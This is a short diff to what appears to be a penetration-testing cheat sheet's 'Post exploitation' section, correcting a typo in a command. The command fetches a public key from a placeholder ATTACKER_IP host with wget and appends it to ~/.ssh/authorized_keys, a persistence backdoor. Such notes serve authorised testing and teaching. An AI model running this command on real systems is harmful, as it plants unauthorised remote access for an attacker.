@@ -8,7 +8,7 @@ Post exploitation
 export TERM=xterm
 export SHELL=bash*
     Add public key to authorized keys:
-    *$ echo $(wget https://ATTACKER_IP/.ssh/id_rsa.pub) >> ~/.ssh/authotized_keys*
+    *$ echo $(wget https://ATTACKER_IP/.ssh/id_rsa.pub) >> ~/.ssh/authorized_keys*
 
 
 Escaping limited interpreters
